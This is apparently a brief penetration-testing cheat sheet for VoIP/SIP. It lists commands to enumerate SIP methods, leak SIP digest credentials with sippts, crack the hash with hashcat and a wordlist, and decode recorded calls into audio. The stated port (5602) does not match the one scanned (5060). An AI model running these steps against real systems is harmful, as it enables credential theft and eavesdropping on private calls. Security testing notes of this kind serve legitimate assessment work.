# Voice over IP Penetration Testing

Port 5602 UDP

## VoIP config enumeration

### 1) Nmap Scan

    sudo nmap -sU -p 5060 --script sip-methods IP

Potential attack vector: VoIP responder on the target has a predefined wildcard 

    <recv response="*">

## Exploitation

### 1) Session Initiation Protocol (SIP) digest leak

Make a fake call to the server by creating a custom call scenario to send 407 Proxy Auth Required instead of ACK when BYE is received from server.

The 407 Proxy authentication required request indicates that the client must now authenticate itself with the proxy.

#### Dump digest

    sippts leak -i IP

#### Crack MD5 hash

    hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

### 2) Decode recorded calls

Example information of the call record

    Input #0, wav, from 'Call-id':
    Duration: 00:00:00:00, bitrate: 128 kb/s
    
    Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 8000 Hz, mono, s16, 128 kb/s
    
    Stream mapping:
    Stream #0:0 -> #0:0 (pcm_s16le (native) -> pcm_mulaw (native))
    
    Output #0, rtp, to 'raw': PT=ITU-T G.711 PCMU
    
    
    Metadata:
    encoder : Lavf58.29.100
    Stream #0:0: Audio: pcm_mulaw, 8000 Hz, mono, s16, 64 kb/s
    
    Metadata:
    encoder : Lavc58.54.100 pcm_mulaw
    size= --kB time=00:00:00:00 bitrate=64.8kbits/s speed= 1x 

#### Decode raw file

    sox -t raw -r 8000 -v 4 -c 1 -e mu-law 2138.raw out.wav

Then, play and listen to the out.wav file.
